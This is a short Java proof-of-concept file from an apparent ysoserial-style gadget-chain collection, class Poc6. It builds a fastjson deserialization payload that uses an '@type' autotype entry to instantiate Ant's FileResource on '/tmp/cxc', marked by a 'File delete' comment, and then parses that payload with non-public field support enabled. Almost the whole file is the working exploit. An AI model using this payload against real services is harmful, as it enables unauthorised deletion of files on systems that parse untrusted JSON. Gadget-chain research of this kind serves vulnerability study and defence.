package ysoserial.payloads.tabbyGadgetChains.tomcat;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc6 {
    public static void main(String[] args) {
        //File delete
        String poc2= "{\n" +
                "    {\n" +
                "        \"x\": {\n" +
                "                \"@type\": \"org.apache.tools.ant.types.resources.FileResource\",\n" +
                "                \"file\": \"/tmp/cxc\",\n" +
                "                \"userName\": \"x\",\n" +
                "                \"password\": \"x\"\n" +
                "        }\n" +
                "    }:\"xxx\"\n" +
                "}\n";

        System.out.println(poc2);
        JSON.parseObject(poc2, Feature.SupportNonPublicField);
    }
}
